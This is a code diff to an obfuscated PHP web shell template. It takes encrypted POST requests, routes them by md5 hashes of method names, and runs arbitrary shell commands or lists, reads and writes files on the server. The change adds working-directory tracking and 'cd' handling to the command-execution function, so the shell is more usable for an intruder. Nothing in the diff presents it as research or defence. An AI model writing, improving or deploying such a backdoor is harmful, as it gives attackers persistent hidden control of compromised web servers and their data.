@@ -1527,7 +1527,7 @@ function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$
 /* 数据加解密算法（自实现） */
 __ALGO__
 /* 业务处理函数 */
-function __CMD__($c){global $_g;$o=@$_g[0]($c.' 2>&1');$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$_g[2]((string)$o),'cwd'=>$d===false?'':$d)));}
+function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o=@$_g[0]($c.' 2>&1');$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
 function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
 function __FETCH__($p){global $_g;$c=@$_g[3]($p);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
 function __STORE__($p,$d){global $_g;$v=@$_g[4]($p,@$_g[1]($d));if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
@@ -1658,7 +1658,7 @@ if(isset($_POST['formData'])){
         $h=intval(substr(md5($m),0,8),16);
         $out='{"ok":false,"error":"unsupported"}';
         if($h==__H_PROBE__){$out=__ENV__();}
-        elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'');}
+        elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
         elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
         elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'');}
         elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'');}
